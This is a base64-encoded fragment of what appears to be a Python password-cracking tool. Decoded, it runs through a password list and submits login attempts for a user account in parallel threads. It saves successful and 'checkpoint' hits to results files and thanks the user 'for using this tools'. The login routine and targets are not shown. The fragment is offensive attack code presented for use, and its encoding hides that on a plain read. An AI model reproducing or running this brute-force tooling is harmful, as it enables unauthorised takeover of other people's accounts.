ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBwYXNzdyBpbiBzZXQobGlzdHBhc3MpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXguc3VibWl0KGxvZ2luLCh1c2Vyc1sxXSksKHBhc3N3KSkNCiAgICAgICAgICAgICAgICBpZiBjaGVjayAhPSAwIG9yIHJlc3VsdCAhPSAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuW1wwMzNbMTszMm3inJRcMDMzWzBtIERvbmUuIGZpbGUgc2F2ZWQgaW4gOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiAgICAgICAgLSBzdWNjZXMgOiByZXN1bHRzLXN1Y2Nlcy50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiAgICAgICAgLSBjaGVja3BvaW50IDogcmVzdWx0cy1jaGVjay50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyB0aGFua3MgZm9yIHVzaW5nIHRoaXMgdG9vbHMiKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4jIERvbmUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyBubyByZXN1bHQiKQ0KICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCiAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICAgICAgICAgIGV4aXQoIiMgQ29ubmVjdGlvbiBlcnJvciIp
